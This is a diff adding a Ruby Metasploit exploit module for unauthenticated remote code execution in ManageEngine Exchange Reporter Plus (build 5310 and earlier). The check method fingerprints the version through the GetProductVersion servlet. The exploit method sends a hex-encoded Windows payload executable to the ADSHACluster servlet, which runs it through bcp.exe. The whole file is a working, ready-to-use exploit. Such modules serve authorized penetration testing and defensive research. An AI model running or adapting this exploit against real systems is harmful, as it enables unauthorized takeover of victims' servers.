@@ -1,0 +1,91 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule  < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Manage Engine Exchange Reporter Plus Unauthenticated RCE',
+      'Description'    => %q{
+        This module exploits a remote code execution vulnerability that
+        exists in Exchange Reporter Plus <= 5310, caused by execution of
+        bcp.exe file inside ADSHACluster servlet
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Kacper Szurek <kacperszurek@gmail.com>'
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://security.szurek.pl/manage-engine-exchange-reporter-plus-unauthenticated-rce.html']
+        ],
+      'Platform'       => ['win'],
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Targets'        => [['Automatic', {}]],
+      'DisclosureDate' => 'Jun 28 2018',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [ true, 'The URI of the application', '/']),
+        Opt::RPORT(8181),
+      ])
+
+  end
+
+  def bin_to_hex(s)
+      s.each_byte.map { |b| b.to_s(16).rjust(2,'0') }.join
+  end
+
+  def check
+    res = send_request_cgi({
+      'method' => 'POST',
+      'uri'    => normalize_uri(target_uri.path, 'exchange', 'servlet', 'GetProductVersion')
+    })
+
+    unless res
+      vprint_error 'Connection failed'
+      return CheckCode::Safe
+    end
+
+    unless res.code == 200
+      vprint_status 'Target is not Manage Engine Exchange Reporter Plus'
+      return CheckCode::Safe
+    end
+
+    begin
+      json = res.get_json_document
+      raise if json.empty? || !json['BUILD_NUMBER']
+    rescue
+      vprint_status 'Target is not Manage Engine Exchange Reporter Plus'
+      return CheckCode::Safe
+    end
+
+    vprint_status "Version: #{json['BUILD_NUMBER']}"
+
+    if json['BUILD_NUMBER'].to_i <= 5310
+      return CheckCode::Appears
+    end
+
+    CheckCode::Safe
+  end
+
+  def exploit
+    res = send_request_cgi({
+      'method'    => 'POST',
+      'uri'       => normalize_uri(target_uri.path, 'exchange', 'servlet', 'ADSHACluster'),
+      'vars_post' => {
+        'MTCALL'  => "nativeClient",
+        'BCP_RLL' => "0102",
+        'BCP_EXE' => bin_to_hex(generate_payload_exe)
+      }
+    })
+  end
+end
